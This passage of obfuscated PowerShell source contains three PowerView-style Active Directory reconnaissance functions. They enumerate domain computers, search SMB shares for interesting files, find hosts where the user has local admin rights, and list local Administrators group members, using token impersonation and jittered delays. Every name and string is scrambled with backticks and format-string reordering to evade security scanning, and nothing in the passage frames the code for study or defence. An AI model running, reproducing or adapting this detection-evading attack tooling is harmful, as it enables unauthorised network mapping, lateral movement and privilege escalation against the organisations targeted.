        [Alias({"{3}{1}{2}{0}" -f'r','mainContro','lle','Do'})]
        [String]
        ${se`RV`eR},

        [ValidateSet({"{0}{1}" -f 'B','ase'}, {"{1}{2}{0}" -f 'el','OneLe','v'}, {"{2}{0}{1}" -f'tr','ee','Sub'})]
        [String]
        ${S`EArCH`S`coPe} = ("{0}{2}{1}"-f'Sub','e','tre'),

        [ValidateRange(1, 10000)]
        [Int]
        ${rE`SuLt`PAgESi`ze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${se`R`V`eRtImelIMIt},

        [Switch]
        ${TO`Mbst`oNE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cReD`E`NtIAL} =  (&("{0}{1}{2}"-f 'GEt','-VaRIAB','lE')  ("{0}{1}"-f'J','h3Xo6') -vA)::"eM`PTy",

        [ValidateRange(1, 10000)]
        [Int]
        ${D`elAY} = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        ${JiT`T`er} = .3,

        [Int]
        [ValidateRange(1, 100)]
        ${tHREA`Ds} = 20
    )

    BEGIN {
        ${coMP`UtErs`EArChERARGu`M`ENtS} = @{
            ("{0}{2}{1}"-f'Pr','ies','opert') = ("{1}{3}{0}{2}"-f 'shostn','d','ame','n')
        }
        if (${PsbOun`d`pAr`AM`etErs}[("{4}{1}{0}{2}{3}"-f'uterDom','p','ai','n','Com')]) { ${com`PU`TE`RseArCheRa`R`g`UmENTS}[("{1}{0}" -f 'n','Domai')] = ${coMP`UtErdOMa`IN} }
        if (${P`SBounD`PaRamE`TErs}[("{1}{0}{3}{2}"-f'm','Co','erLDAPFilter','put')]) { ${coM`pUTe`RS`E`ArChe`RA`RgUMen`TS}[("{1}{2}{0}" -f'Filter','LDA','P')] = ${ComPu`Terld`AP`F`ilteR} }
        if (${Ps`BO`Un`DPAR`AMeterS}[("{2}{3}{1}{4}{0}"-f 'ase','terSe','C','ompu','archB')]) { ${CoMputErseArchE`RA`RgU`meN`Ts}[("{2}{0}{1}" -f'hBas','e','Searc')] = ${COm`PU`T`eRSEar`cHb`Ase} }
        if (${p`sboU`NdpAr`A`mETERS}[("{0}{5}{3}{4}{2}{1}" -f'Co','tem','ingSys','erOpera','t','mput')]) { ${CoMPUtERsEa`RCHeRAr`GuME`N`Ts}[("{2}{3}{1}{0}" -f'em','t','Operatin','gSys')] = ${oPEr`ATi`NGSys`TEm} }
        if (${p`sbo`U`NDP`A`RamETErs}[("{6}{4}{0}{3}{1}{5}{2}"-f'p','terServ','k','u','m','icePac','Co')]) { ${Co`MpUtERS`eArChER`ArGUme`NtS}[("{1}{0}{2}" -f'P','Service','ack')] = ${SERViC`e`Pack} }
        if (${Ps`BO`UndpaR`AM`eT`ErS}[("{0}{2}{3}{1}" -f 'Compute','me','r','SiteNa')]) { ${COMpU`TEr`s`E`Ar`cheRar`G`U`MeNTS}[("{0}{1}{2}"-f'Sit','eNa','me')] = ${siTe`N`AME} }
        if (${PSbOuND`PAraME`TE`RS}[("{0}{2}{1}"-f 'Serv','r','e')]) { ${co`mPuTerse`ArChERAR`g`UMenTS}[("{0}{2}{1}" -f 'Ser','er','v')] = ${seR`V`eR} }
        if (${p`sbounDpa`RAm`EteRs}[("{0}{1}{2}" -f'Sea','rchSco','pe')]) { ${ComPuteRsEARche`RaRg`UM`EN`Ts}[("{2}{0}{3}{1}" -f 'r','e','Sea','chScop')] = ${SE`A`RCHsC`ope} }
        if (${psbOu`ND`p`ARaMet`ers}[("{0}{3}{2}{1}" -f'R','eSize','ltPag','esu')]) { ${Co`mP`UtErs`e`ARcHer`ArgUMeN`TS}[("{1}{2}{3}{0}" -f 'eSize','ResultP','a','g')] = ${R`E`s`ULtpagES`IZe} }
        if (${pSBOU`NDpAra`mEt`E`RS}[("{1}{3}{0}{2}"-f'verTim','S','eLimit','er')]) { ${coMPU`TeRSea`RcH`e`R`A`RGuMeN`Ts}[("{2}{0}{1}{3}" -f'r','Time','Serve','Limit')] = ${seRV`e`R`TimeL`IMIt} }
        if (${PS`BounDpa`RAmE`TeRS}[("{0}{1}{2}{3}" -f'Tom','b','st','one')]) { ${COM`p`UtErSEaRCHEr`A`RGUM`E`NtS}[("{0}{2}{1}" -f'Tom','tone','bs')] = ${ToM`B`St`OnE} }
        if (${p`SBoU`NdP`ARAMe`TeRs}[("{0}{3}{1}{2}"-f 'Cred','nt','ial','e')]) { ${C`oM`Pu`TEr`sEa`R`cHeRarguments}[("{0}{2}{1}"-f'Credent','l','ia')] = ${CrE`D`ENTIal} }

        if (${PsbO`UNd`parA`met`eRs}[("{0}{1}{2}" -f'C','omputer','Name')]) {
            ${T`ARG`etc`oMP`Ut`ers} = ${Co`mput`eRn`Ame}
        }
        else {
            &("{3}{0}{4}{1}{2}" -f'te-','rbos','e','Wri','Ve') ("{0}{5}{4}{8}{11}{3}{9}{2}{10}{6}{1}{7}" -f'[Fin','a','t','ing ','gDomain','d-Interestin','m','in','ShareFile] Que','compu','ers in the do','ry')
            ${T`ARG`e`TC`oMPuTerS} = &("{2}{0}{1}{3}{4}{5}" -f 'et-','Domain','G','Compu','te','r') @ComputerSearcherArguments | &("{0}{3}{2}{1}" -f'Select-','ect','j','Ob') -ExpandProperty ("{1}{0}{2}" -f 'stn','dnsho','ame')
        }
        &("{2}{1}{0}" -f 'erbose','e-V','Writ') "[Find-InterestingDomainShareFile] TargetComputers length: $($TargetComputers.Length) "
        if (${tARg`E`TCOmPuT`ers}."l`engTH" -eq 0) {
            throw ("{5}{2}{9}{6}{0}{12}{8}{7}{1}{4}{11}{10}{3}"-f 'nSha',' found ','nter','e','to','[Find-I','omai','ts','eFile] No hos','estingD','merat',' enu','r')
        }

        
        ${hosTe`N`U`mbLOCk} = {
            Param(${COmPUtE`R`NAMe}, ${I`N`CLUdE}, ${EX`c`luDe`Dsh`ArES}, ${oF`FicedO`Cs}, ${eXcL`UdE`hidD`En}, ${F`REs`HExEs}, ${cH`EC`KwRitE`A`cC`EsS}, ${To`Ken`hand`Le})

            if (${TOk`EnhAND`Le}) {
                
                ${n`ULl} = &("{1}{6}{3}{4}{7}{2}{0}{5}"-f 'o','I','sonati','e','r','n','nvoke-Us','Imper') -TokenHandle ${tOK`e`NhA`NdLE} -Quiet
            }

            ForEach (${targeT`cOmp`UTEr} in ${cO`mpUTeRNA`ME}) {

                ${sEAr`ch`sHARes} = @()
                if (${ta`RGEtcO`MPUt`er}.("{1}{0}{2}" -f'ar','St','tsWith').Invoke('\\')) {
                    
                    ${SEA`R`ChSHArES} += ${TArGEtcOM`pUT`er}
                }
                else {
                    ${U`P} = &("{1}{0}{3}{2}" -f'e','T','onnection','st-C') -Count 1 -Quiet -ComputerName ${TaRget`C`om`pUTEr}
                    if (${uP}) {
                        
                        ${Sha`Res} = &("{0}{1}{2}{3}" -f'Get-','N','etS','hare') -ComputerName ${TArge`Tc`O`mpUt`Er}
                        ForEach (${ShA`RE} in ${Sh`ArES}) {
                            ${sH`Ar`enAme} = ${S`h`ARE}."nA`Me"
                            ${p`ATH} = '\\'+${targ`ETCoM`PU`T`Er}+'\'+${Sha`R`e`NaME}
                            
                            if ((${SH`AR`ename}) -and (${shaRE`N`AME}.("{1}{0}"-f'rim','T').Invoke() -ne '')) {
                                
                                if (${EX`CLUD`ed`SHaR`eS} -NotContains ${s`haREn`AmE}) {
                                    
                                    try {
                                        ${n`ULl} =  ${R4`F3`Tz}::("{1}{0}{2}"-f'File','Get','s').Invoke(${Pa`TH})
                                        ${SEa`RcHS`HaREs} += ${P`Ath}
                                    }
                                    catch {
                                        &("{0}{1}{2}" -f 'Wri','te-Ve','rbose') ('['+'!] '+'N'+'o '+'acc'+'ess'+' '+'to'+' '+"$Path")
                                    }
                                }
                            }
                        }
                    }
                }

                ForEach (${sH`A`RE} in ${S`e`ArC`hs`hArES}) {
                    &("{2}{1}{3}{0}" -f 'bose','te-Ve','Wri','r') ('Search'+'i'+'ng'+' '+'sh'+'are:'+' '+"$Share")
                    ${sEAR`chA`Rgs} = @{
                        ("{1}{0}"-f'h','Pat') = ${s`HA`RE}
                        ("{0}{1}{2}"-f 'I','nc','lude') = ${inCLU`De}
                    }
                    if (${OFfiC`e`D`oCS}) {
                        ${s`EA`RChARGS}[("{3}{1}{2}{0}" -f 's','ice','Doc','Off')] = ${o`FfIc`ed`ocs}
                    }
                    if (${FResH`E`xEs}) {
                        ${s`EarCHA`RGS}[("{0}{1}" -f 'Fres','hEXEs')] = ${fR`e`sHExES}
                    }
                    if (${lasta`CC`esS`TiMe}) {
                        ${seaR`ch`A`RGS}[("{3}{1}{0}{2}{4}" -f 'ccess','astA','Ti','L','me')] = ${lAStAcCE`S`st`I`Me}
                    }
                    if (${l`ASTWrITEtI`me}) {
                        ${sEar`cHaR`gs}[("{1}{4}{2}{0}{3}"-f 'T','LastWr','te','ime','i')] = ${lA`s`T`WRi`TeTIMe}
                    }
                    if (${cr`EaTioN`Time}) {
                        ${Sea`RC`hArGS}[("{0}{1}{3}{2}" -f 'Creat','ion','ime','T')] = ${CR`EA`TIO`Ntime}
                    }
                    if (${cHECK`wr`ItEa`cceSs}) {
                        ${SE`ARc`HA`RGs}[("{3}{2}{1}{0}" -f 's','iteAcces','eckWr','Ch')] = ${Che`CKwR`iTEa`CC`eSS}
                    }
                    &("{2}{3}{1}{0}"-f'le','nterestingFi','Fi','nd-I') @SearchArgs
                }
            }

            if (${T`O`Ke`NHanDLe}) {
                &("{0}{1}{3}{2}"-f 'Inv','oke-','ToSelf','Revert')
            }
        }

        ${L`o`G`ONtOkeN} = ${n`UlL}
        if (${ps`BoUN`DPA`RamEt`ers}[("{1}{2}{0}" -f'ential','Cre','d')]) {
            if (${pSBO`UndPAra`mE`TE`Rs}[("{0}{1}"-f 'D','elay')] -or ${psb`OuN`DP`Ar`AMetE`Rs}[("{3}{2}{0}{1}"-f'nS','uccess','opO','St')]) {
                ${lOGon`T`o`kEn} = &("{2}{5}{1}{0}{3}{4}" -f 'Im','ke-User','I','pe','rsonation','nvo') -Credential ${CrEd`en`TIaL}
            }
            else {
                ${lo`go`NtOkeN} = &("{4}{2}{0}{3}{1}"-f 'serIm','rsonation','U','pe','Invoke-') -Credential ${cRe`den`TIAl} -Quiet
            }
        }
    }

    PROCESS {
        
        if (${PsbOUNdpa`Ra`ME`TERs}[("{1}{0}"-f'elay','D')] -or ${Ps`BounDpar`AM`Eters}[("{1}{0}{4}{2}{3}" -f't','S','c','ess','opOnSuc')]) {

            &("{3}{0}{1}{2}" -f'it','e-','Verbose','Wr') "[Find-InterestingDomainShareFile] Total number of hosts: $($TargetComputers.count) "
            &("{1}{2}{0}" -f'Verbose','Wri','te-') ('[F'+'ind-I'+'nterestingDomainS'+'h'+'ar'+'eFile]'+' '+'Dela'+'y: '+"$Delay, "+'Jit'+'te'+'r: '+"$Jitter")
            ${c`ounTeR} = 0
            ${RA`N`DnO} = &("{2}{1}{0}"-f 'ect','Obj','New-') ("{2}{1}{3}{0}" -f 'm','yst','S','em.Rando')

            ForEach (${TarG`E`Tcomput`Er} in ${tArG`etCOmpUT`E`RS}) {
                ${c`oUnt`Er} = ${cOU`NTeR} + 1

                
                &("{2}{0}{1}" -f'a','rt-Sleep','St') -Seconds ${R`An`DNo}.("{1}{0}"-f 't','Nex').Invoke((1-${jiT`TER})*${De`lAy}, (1+${j`i`TTer})*${d`E`lAY})

                &("{3}{2}{0}{1}"-f'o','se','-Verb','Write') "[Find-InterestingDomainShareFile] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count)) "
                &("{1}{0}{2}"-f 'voke','In','-Command') -ScriptBlock ${h`Os`TenUm`Blo`ck} -ArgumentList ${T`AR`GE`TCOMPuteR}, ${InClu`De}, ${exC`LuDED`Sh`ARES}, ${oFFiC`eDO`CS}, ${eXcLU`dEh`I`dd`EN}, ${FreSh`eX`ES}, ${C`hEC`kw`RIte`ACcEsS}, ${l`oGoN`TOK`en}
            }
        }
        else {
            &("{2}{1}{0}"-f'bose','r','Write-Ve') ('[Fi'+'n'+'d'+'-'+'I'+'nterestingDomai'+'nShareFi'+'le'+'] '+'U'+'sing '+'thread'+'ing'+' '+'wi'+'th '+'t'+'hreads: '+"$Threads")

            
            ${scRI`pt`p`ARaMs} = @{
                ("{1}{2}{0}" -f'e','In','clud') = ${i`NClU`dE}
                ("{3}{0}{2}{1}{4}" -f 'lud','hare','edS','Exc','s') = ${E`Xc`l`UDEDSHar`eS}
                ("{1}{0}{2}"-f 'fficeDo','O','cs') = ${Off`i`cE`dOCs}
                ("{2}{1}{0}" -f'eHidden','clud','Ex') = ${E`xcl`UdEHid`D`eN}
                ("{2}{0}{1}"-f's','hEXEs','Fre') = ${F`Re`ShEx`es}
                ("{3}{2}{0}{1}"-f'riteAcces','s','eckW','Ch') = ${CHe`CKWrI`T`E`ACCEss}
                ("{0}{1}{2}{3}"-f'Token','Hand','l','e') = ${LO`gonTO`KEn}
            }

            
            &("{4}{1}{3}{5}{0}{2}" -f 'dFunctio','w-Threa','n','d','Ne','e') -ComputerName ${t`A`RG`ETC`OMPUTeRS} -ScriptBlock ${hoSTEN`Um`BL`Ock} -ScriptParameters ${ScrIP`T`Pa`RamS} -Threads ${ThR`e`AdS}
        }
    }

    END {
        if (${LO`G`oNt`OkEn}) {
            &("{2}{3}{0}{1}"-f'oSe','lf','Invoke-R','evertT') -TokenHandle ${L`oGOnTo`k`EN}
        }
    }
}


function fInD-`l`Oc`AlADmI`NacCE`Ss {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{4}{0}{3}{1}" -f'u','rocess','P','ldP','SSho'}, '')]
    [OutputType([String])]
    Param(
        [Parameter(PosITION = 0, vALuEFromPipElinE = ${tr`Ue}, VALUEfRoMPiPELinEbyPROpERTynAME = ${T`RuE})]
        [Alias({"{1}{0}{2}{3}"-f'NS','D','Ho','stName'})]
        [String[]]
        ${co`MP`U`TeR`NAMe},

        [ValidateNotNullOrEmpty()]
        [String]
        ${coMput`eRDom`A`in},

        [ValidateNotNullOrEmpty()]
        [String]
        ${C`O`mPuterldA`pfI`LtER},

        [ValidateNotNullOrEmpty()]
        [String]
        ${Com`PuTErS`e`AR`cHbASe},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{1}{4}{2}{0}"-f'tem','in','ys','Operat','gS'})]
        [String]
        ${cO`MP`U`TeR`op`ERatIn`GSySTEm},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{1}" -f 'Ser','icePack','v'})]
        [String]
        ${com`p`UTe`RSE`R`VIcEpaCK},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}" -f 'me','SiteNa'})]
        [String]
        ${CoMp`UTeRs`I`TEnaMe},

        [Switch]
        ${cHecksH`AR`EAc`CE`sS},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{4}{3}{1}" -f'Doma','ller','i','ntro','nCo'})]
        [String]
        ${Se`R`VeR},

        [ValidateSet({"{0}{1}" -f'B','ase'}, {"{1}{0}{2}" -f 've','OneLe','l'}, {"{0}{1}" -f 'Sub','tree'})]
        [String]
        ${S`e`Archs`COPE} = ("{1}{2}{0}"-f'ree','Su','bt'),

        [ValidateRange(1, 10000)]
        [Int]
        ${Re`SU`l`TpAgeSiZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${S`E`RVeR`TiM`elImiT},

        [Switch]
        ${TOMbs`T`One},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${Cr`e`DEnTial} =   ( &("{1}{2}{0}{3}" -f'-cHIL','gE','T','dITEM') ("{2}{1}{0}{3}" -f 'XO','ble:JH3','vArIa','6')  )."VA`lue"::"EM`pty",

        [ValidateRange(1, 10000)]
        [Int]
        ${Del`AY} = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        ${jIT`TeR} = .3,

        [Int]
        [ValidateRange(1, 100)]
        ${T`hreaDS} = 20
    )

    BEGIN {
        ${cOMpu`TeRSeArCHErar`g`U`MeNTS} = @{
            ("{1}{3}{2}{0}" -f's','P','ertie','rop') = ("{0}{2}{1}" -f 'dn','hostname','s')
        }
        if (${pS`B`OunDparAmE`Ters}[("{1}{2}{0}"-f 'main','Compu','terDo')]) { ${co`Mp`UTer`Se`ArC`HE`Rar`GUME`NTs}[("{1}{0}"-f'in','Doma')] = ${coMPUTeRDO`ma`In} }
        if (${PSb`oUn`d`P`ARam`ETERS}[("{4}{1}{3}{0}{2}" -f'LDAP','e','Filter','r','Comput')]) { ${c`o`mpUt`ErSEARCHeRaRGum`eN`Ts}[("{1}{0}{2}" -f't','LDAPFil','er')] = ${ComPute`RLdapf`iL`T`er} }
        if (${p`sb`oun`DPAramet`ers}[("{2}{1}{0}{4}{3}" -f'uterS','omp','C','archBase','e')]) { ${CoM`P`UTERS`EA`RC`HErArGUM`EN`TS}[("{0}{1}{2}"-f 'SearchBa','s','e')] = ${CO`M`Puter`sEar`ch`BAse} }
        if (${Ps`B`oUNdPara`m`Ete`RS}[("{2}{0}{1}" -f 'trai','ned','Uncons')]) { ${CoMPuTErs`e`ARCH`erArg`Ume`NTS}[("{1}{0}{3}{2}"-f'n','U','ained','constr')] = ${Un`CONs`TRa`INeD} }
        if (${PsB`OUNDPA`RA`ME`TERs}[("{2}{3}{0}{1}" -f 't','em','ComputerOpe','ratingSys')]) { ${cOmPU`Te`RSea`Rch`erarGu`mEnts}[("{1}{2}{0}{3}" -f'Syst','Op','erating','em')] = ${opEra`T`iNGsY`sTEM} }
        if (${PSBo`UnDpA`RAME`Ters}[("{3}{0}{2}{1}"-f'pute','k','rServicePac','Com')]) { ${cOmpu`T`ERs`EAr`c`HERARgUMENTs}[("{2}{1}{0}" -f'k','ac','ServiceP')] = ${S`ERV`iCEp`Ack} }
        if (${PS`BO`UnDpA`RAMEtE`Rs}[("{3}{1}{2}{0}" -f'Name','rSi','te','Compute')]) { ${c`O`MPuTERSEAr`CHeRA`RG`U`menTs}[("{1}{0}{2}" -f 'ite','S','Name')] = ${SITE`Name} }
        if (${P`sbounDPA`RAMe`T`Ers}[("{2}{0}{1}"-f 'er','ver','S')]) { ${CO`M`pUtErSe`A`RCheRaRGU`Men`TS}[("{0}{2}{1}" -f 'Se','ver','r')] = ${S`ErV`eR} }
        if (${PSb`OUnDp`Ar`Am`ETERS}[("{2}{0}{1}" -f 'rchS','cope','Sea')]) { ${COM`PUTer`sEar`CHeR`ARg`U`m`E`NTS}[("{0}{1}{2}" -f 'SearchSc','op','e')] = ${seA`RC`hSCo`pE} }
        if (${pS`BO`Un`DparameTErS}[("{3}{2}{0}{1}" -f'z','e','eSi','ResultPag')]) { ${coMPUteRS`e`ARcHe`Ra`RgumenTS}[("{2}{0}{1}" -f'Pa','geSize','Result')] = ${Res`ULT`PAge`sIZE} }
        if (${p`SB`OUnDpar`AMEt`ErS}[("{2}{0}{3}{4}{1}" -f 've','t','Ser','rTimeL','imi')]) { ${cOMPUters`EarCh`E`R`ARgU`mE`Nts}[("{2}{1}{0}{3}"-f'Ti','rver','Se','meLimit')] = ${sErV`eR`TI`meLiM`IT} }
        if (${PsB`oUndP`ARame`TE`Rs}[("{2}{1}{0}" -f'ne','to','Tombs')]) { ${Co`mput`er`seARch`eRa`Rgu`MEN`TS}[("{2}{0}{1}"-f'b','stone','Tom')] = ${TOmbS`TO`NE} }
        if (${psbOU`NDpA`R`AM`e`Ters}[("{0}{2}{1}{3}"-f 'C','denti','re','al')]) { ${cO`M`pUt`e`RSe`ARch`EraRGUme`NTS}[("{1}{0}{2}" -f 'a','Credenti','l')] = ${CrEd`EN`Tial} }

        if (${PSboUN`d`PAr`AM`ETE`Rs}[("{2}{3}{0}{1}"-f'terNa','me','C','ompu')]) {
            ${t`Ar`geTCo`MpUt`erS} = ${C`o`Mp`UT`ernamE}
        }
        else {
            &("{0}{3}{2}{1}"-f'W','rbose','e','rite-V') ("{9}{1}{8}{4}{0}{2}{10}{6}{7}{5}{3}"-f 'dmi','n','nA','main','lA','the do','ce','ss] Querying computers in ','d-Loca','[Fi','c')
            ${tA`RgeT`comP`UTers} = &("{3}{2}{4}{1}{0}" -f'er','ut','nCom','Get-Domai','p') @ComputerSearcherArguments | &("{2}{1}{0}" -f 'ect','lect-Obj','Se') -ExpandProperty ("{3}{1}{0}{2}"-f 'hos','ns','tname','d')
        }
        &("{2}{1}{4}{0}{3}"-f 'erbos','ite-','Wr','e','V') "[Find-LocalAdminAccess] TargetComputers length: $($TargetComputers.Length) "
        if (${TARg`Etc`o`mpu`TERs}."Le`NgtH" -eq 0) {
            throw ("{2}{5}{6}{8}{1}{3}{9}{10}{11}{12}{7}{4}{0}"-f 'e','minAcce','[Find-','s','merat','Loc','al','nu','Ad','s] No',' ho','s','ts found to e')
        }

        
        ${hO`Sten`Um`B`lOcK} = {
            Param(${C`OMpu`Ter`NamE}, ${tO`k`e`NHANdLe})

            if (${t`OKEN`HAnD`LE}) {
                
                ${nU`lL} = &("{1}{3}{4}{2}{0}"-f'nation','Invoke-','so','UserImp','er') -TokenHandle ${tOK`eN`HandlE} -Quiet
            }

            ForEach (${tA`RgeT`C`OMPU`TeR} in ${coMpu`TErn`A`ME}) {
                ${UP} = &("{2}{1}{0}{3}" -f'ecti','t-Conn','Tes','on') -Count 1 -Quiet -ComputerName ${Tar`gEtC`oMpU`T`ER}
                if (${up}) {
                    
                    ${a`CCEss} = &("{3}{2}{1}{0}"-f'ess','-AdminAcc','t','Tes') -ComputerName ${TArG`eTCOm`p`U`TEr}
                    if (${a`CcE`SS}."i`SA`DMin") {
                        ${tArgEtcO`MPu`T`ER}
                    }
                }
            }

            if (${TO`KE`NHANDle}) {
                &("{4}{5}{1}{0}{3}{2}" -f 'rt','e','lf','ToSe','Invok','e-Rev')
            }
        }

        ${L`Og`onTo`KEn} = ${n`Ull}
        if (${Psb`OuNdP`A`RameT`ErS}[("{2}{1}{0}"-f'al','edenti','Cr')]) {
            if (${p`SBoU`ND`PARAmetE`RS}[("{1}{0}" -f'lay','De')] -or ${pSBoun`D`p`ARAMe`TErs}[("{0}{1}{2}"-f'StopO','nSucce','ss')]) {
                ${L`o`gONToken} = &("{5}{3}{1}{0}{2}{4}"-f 'mpersona','erI','ti','nvoke-Us','on','I') -Credential ${creden`T`IAl}
            }
            else {
                ${loGONt`o`ken} = &("{2}{1}{0}{5}{3}{4}" -f'e-Us','nvok','I','mperso','nation','erI') -Credential ${c`Re`denTIAl} -Quiet
            }
        }
    }

    PROCESS {
        
        if (${P`SBouNd`Pa`RAMETE`RS}[("{1}{0}"-f 'y','Dela')] -or ${P`S`BOUN`DpArAmET`ers}[("{1}{2}{0}" -f'uccess','Stop','OnS')]) {

            &("{0}{1}{2}"-f 'Wr','it','e-Verbose') "[Find-LocalAdminAccess] Total number of hosts: $($TargetComputers.count) "
            &("{1}{3}{0}{2}" -f't','W','e-Verbose','ri') ('['+'Fi'+'n'+'d-Lo'+'ca'+'lAdminAcce'+'ss'+'] '+'D'+'elay'+': '+"$Delay, "+'Ji'+'tt'+'er: '+"$Jitter")
            ${COu`NTER} = 0
            ${RanD`NO} = &("{0}{2}{3}{1}"-f 'Ne','ct','w-','Obje') ("{3}{1}{2}{0}{4}" -f'o','ystem.Ra','nd','S','m')

            ForEach (${tAr`getC`OmpU`Ter} in ${Ta`R`gETComp`U`T`ErS}) {
                ${cOu`Nt`Er} = ${c`O`UnTer} + 1

                
                &("{2}{0}{1}" -f'tart-Sle','ep','S') -Seconds ${r`AnDno}.("{0}{1}" -f'Nex','t').Invoke((1-${JiTt`Er})*${dE`l`AY}, (1+${j`it`TEr})*${D`Elay})

                &("{2}{0}{1}"-f 'Ver','bose','Write-') "[Find-LocalAdminAccess] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count)) "
                &("{0}{1}{3}{2}"-f'Invoke-','Comm','nd','a') -ScriptBlock ${H`o`SteNUmb`lo`ck} -ArgumentList ${ta`R`gETC`omPUtER}, ${LOGoN`To`k`EN}
            }
        }
        else {
            &("{0}{2}{1}"-f'Write','Verbose','-') ('[F'+'i'+'nd'+'-Local'+'A'+'dmin'+'Acc'+'ess] '+'Us'+'in'+'g '+'th'+'rea'+'di'+'ng '+'w'+'ith '+'thre'+'ads'+': '+"$Threads")

            
            ${sCRI`PtP`Ar`AMs} = @{
                ("{2}{3}{0}{1}" -f'H','andle','Tok','en') = ${log`ON`TOKen}
            }

            
            &("{3}{5}{1}{4}{6}{2}{0}" -f 'ction','-','dFun','Ne','Thread','w','e') -ComputerName ${TA`RGeT`CO`M`PuTe`RS} -ScriptBlock ${HosTe`N`UMBLo`ck} -ScriptParameters ${SC`R`IpTparaMs} -Threads ${th`R`eADs}
        }
    }
}


function fI`ND`-`DOma`iNlOC`A`LGRouPM`EM`Ber {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{3}{1}{2}"-f'PSS','o','cess','houldPr'}, '')]
    [OutputType({"{4}{6}{0}{3}{1}{2}{5}"-f'r','pMe','m','View.LocalGrou','Po','ber.API','we'})]
    [OutputType({"{7}{2}{3}{4}{0}{5}{6}{1}" -f'ew.Lo','ber.WinNT','ow','erV','i','c','alGroupMem','P'})]
    Param(
        [Parameter(posiTIOn = 0, vALuefRomPIPELinE = ${tr`Ue}, vaLuefRomPipelinebYProPeRtyNamE = ${t`RUe})]
        [Alias({"{2}{0}{1}"-f 'm','e','DNSHostNa'})]
        [String[]]
        ${cO`m`puTe`RNAME},

        [ValidateNotNullOrEmpty()]
        [String]
        ${c`omPuteRd`om`Ain},

        [ValidateNotNullOrEmpty()]
        [String]
        ${c`O`MP`UterLDApFI`l`Ter},

        [ValidateNotNullOrEmpty()]
        [String]
        ${coM`PUteR`se`ARcHB`Ase},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}{3}" -f 'yst','S','Operating','em'})]
        [String]
        ${co`MP`UTEROPE`RATIn`gSy`SteM},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{2}"-f 'ice','Serv','Pack'})]
        [String]
        ${co`mPUTE`R`S`E`RVICEp`AcK},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{1}" -f 'SiteN','me','a'})]
        [String]
        ${cOM`PUTeRsi`TE`Na`Me},

        [Parameter(ValUefRompIpElinEbyPrOPerTyName = ${t`RuE})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${G`ROup`NAmE} = ("{0}{1}{3}{2}" -f'Ad','mini','rators','st'),

        [ValidateSet('API', {"{1}{0}" -f'inNT','W'})]
        [Alias({"{2}{1}{3}{0}"-f'ethod','ollect','C','ionM'})]
        [String]
        ${ME`T`hoD} = 'API',

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}{4}{2}{3}" -f'Dom','ai','ontro','ller','nC'})]
        [String]
        ${S`e`RVER},

        [ValidateSet({"{0}{1}" -f'Bas','e'}, {"{0}{2}{1}" -f 'OneL','l','eve'}, {"{1}{0}" -f'ubtree','S'})]
        [String]
        ${sEAr`ChScO`pe} = ("{1}{2}{0}"-f'ree','Su','bt'),

        [ValidateRange(1, 10000)]
        [Int]
        ${res`U`Lt`Pa`GEsIZe} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${se`R`V`er`TIMElI`mIT},

        [Switch]
        ${tOm`BSt`O`NE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${Cr`E`dEntI`Al} =  ( &("{0}{3}{2}{1}"-f 'gEt-','Le','IAb','VAR')  ("JH3X"+"O6") -VALU)::"E`Mpty",

        [ValidateRange(1, 10000)]
        [Int]
        ${dE`LAy} = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        ${JI`T`TEr} = .3,

        [Int]
        [ValidateRange(1, 100)]
        ${tHR`e`Ads} = 20
    )

    BEGIN {
        ${c`OMPUtErse`ArcHera`Rg`U`M`eN`TS} = @{
            ("{2}{0}{1}"-f'roperti','es','P') = ("{0}{2}{1}"-f 'dnshost','me','na')
        }
        if (${pS`Bo`UnDPaR`AmEte`Rs}[("{0}{1}{2}{3}"-f'Co','m','put','erDomain')]) { ${C`om`p`UTErseaR`CH`eRAR`g`UmEntS}[("{1}{0}" -f 'in','Doma')] = ${co`mP`Ut`e`RDOmaIn} }
        if (${ps`BO`Un`DpArA`m`ETErs}[("{2}{0}{5}{4}{3}{1}" -f'p','Filter','Com','P','erLDA','ut')]) { ${co`MPUte`R`S`ea`R`ChERAr`GUm`enTs}[("{2}{1}{0}{3}"-f 'te','DAPFil','L','r')] = ${CoMP`UtERlDAPF`Il`TEr} }
        if (${p`sBOU`NDPARa`m`eTeRs}[("{0}{4}{2}{3}{1}" -f 'ComputerS','e','r','chBas','ea')]) { ${Com`P`U`TeRsea`RcherARgum`e`NTS}[("{2}{0}{1}"-f 'ear','chBase','S')] = ${cOMp`UTE`RS`eA`Rc`HBAse} }
        if (${P`sbOUnDPA`R`Am`e`TeRS}[("{0}{1}{3}{2}" -f'Un','con','trained','s')]) { ${COm`puT`ErS`earCheRaR`g`U`MEnTs}[("{0}{3}{1}{2}" -f'U','strai','ned','ncon')] = ${uNc`ONSTraI`NeD} }
        if (${p`SBo`UN`DPAraMeT`eRS}[("{1}{6}{0}{3}{2}{5}{4}"-f'mpu','C','OperatingSys','ter','em','t','o')]) { ${COm`pUTer`SeaRcHErAR`guMEN`Ts}[("{0}{1}{2}" -f'Operatin','g','System')] = ${OP`Er`ATI`NG`SySTeM} }
        if (${PS`Bo`UNdpAr`AMeT`E`Rs}[("{0}{1}{2}{3}"-f 'Co','mp','uterServiceP','ack')]) { ${COmPUTer`Se`A`RChE`R`ArgU`MeNts}[("{1}{0}{2}" -f'iceP','Serv','ack')] = ${S`e`RvI`cePaCK} }
